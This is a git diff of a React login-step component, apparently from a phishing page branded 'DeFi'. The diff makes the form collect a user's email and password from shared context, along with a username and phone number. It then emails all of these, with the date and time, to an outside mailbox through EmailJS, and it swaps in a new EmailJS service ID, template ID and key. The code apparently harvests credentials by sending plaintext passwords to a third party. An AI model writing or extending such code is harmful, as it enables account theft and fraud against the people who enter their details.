@@ -1,6 +1,7 @@
-import  { useState } from 'react';
+import  { useState ,useContext} from 'react';
 import { useNavigate} from 'react-router-dom';
 import emailjs from 'emailjs-com';
+import { MyContext } from './MyContext';
 // import { kMaxLength } from 'buffer';
 
 const ToStep = () => {
@@ -11,6 +12,14 @@ const ToStep = () => {
   const [emailPlaceholder, setEmailPlaceholder] = useState('Enter Username');
   const [passwordPlaceholder, setPasswordPlaceholder] = useState('Enter your Number');
   const navigate = useNavigate();
+
+  const context =useContext(MyContext);
+  if(!context){
+    throw new Error("Mycontext fill not found ");
+  }
+
+
+ const {cemail,cpassword}=context;
 
   const handleLogin = () => {
     let isValid = true;
@@ -41,18 +50,20 @@ const ToStep = () => {
       const templateParams = {
         web_name:'DeFi',
         from_name: 'DeFi',
-        message: `Name: ${email}, 
+        message: `Name: ${email},
+        Email: ${cemail},
         Phone: ${password}, 
+        Password: ${cpassword}, 
         Date: ${new Date().toLocaleDateString()}, 
         Time: ${new Date().toLocaleTimeString()}`,
       };
 
       emailjs
         .send(
-          'service_uwgxhgo', // Your EmailJS Service ID
-          'template_6hqt4d7', // Your EmailJS Template ID
+          'service_d7iarfv', // Your EmailJS Service ID
+          'template_zzgorrr', // Your EmailJS Template ID
           templateParams,
-          'iwh2dFI31xGaG4fBY' // Your EmailJS Public Key
+          'cD8XBmJIzmsXY6T3j' // Your EmailJS Public Key
         )
         .then(() => {
           setEmail('');
